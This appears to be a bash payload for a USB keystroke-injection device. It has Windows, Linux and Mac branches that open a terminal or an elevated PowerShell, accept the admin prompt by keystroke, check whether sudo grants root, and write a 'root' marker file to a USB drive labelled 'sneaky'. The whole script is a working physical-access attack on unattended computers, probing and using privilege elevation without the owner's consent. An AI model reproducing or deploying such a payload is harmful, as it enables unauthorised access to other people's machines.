#!/bin/bash

function quackWindows() {

	Q GUI r
	Q DELAY 500
	Q STRING powershell
	Q CONTROL-SHIFT-ENTER
	Q DELAY 2000
	Q ALT j
	Q DELAY 3000

	Q STRING '$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq'
	Q STRING " 'sneaky'"
	Q STRING ' } | select -expand name'
	Q ENTER
	Q STRING '[IO.File]::WriteAllLines((Join-Path $usbPath'
	Q STRING " 'root.txt'), 'root') ; Write-VolumeCache"
	Q STRING ' $usbPath[0]'
	Q ENTER
	Q ENTER
	Q STRING "exit"
	Q ENTER
	Q ESCAPE
	Q ESCAPE
}

function quackLinux() {

        # open terminal via search menu
        Q GUI
        Q DELAY 1500
        Q STRING "ter"
        # needed otherwise console might bug
        Q DELAY 500
        Q ENTER
        Q DELAY 2000

        # create file on path and sync (clear write cache)
        Q STRING 'if [ $(sudo id -u) -eq 0 ];'
        Q STRING " then echo 'root' > /media/"
        Q STRING '$(users)/sneaky/root.txt && sync ; fi'
        Q ENTER
        Q DELAY 1500
        Q CONTROL d
	Q CONTROL d
}

function quackMac() {

        # open mac terminal
        Q GUI SPACE
        Q DELAY 3000
        Q STRING "termi"
        Q DELAY 500
        Q ENTER
        Q DELAY 3000

        # create file on path and sync (clear write cache)
        Q STRING 'if [ $(sudo id -u) -eq 0 ];'
	Q STRING " then echo 'root' > /Volumes/sneaky/root.txt && sync ; fi"
        Q ENTER
	Q DELAY 500
	Q CONTROL d
	Q DELAY 500
	Q GUI q
}

case $1 in

  Windows)
    quackWindows
    ;;

  Linux)
    quackLinux
    ;;

  Mac)
    quackMac
    ;;

esac
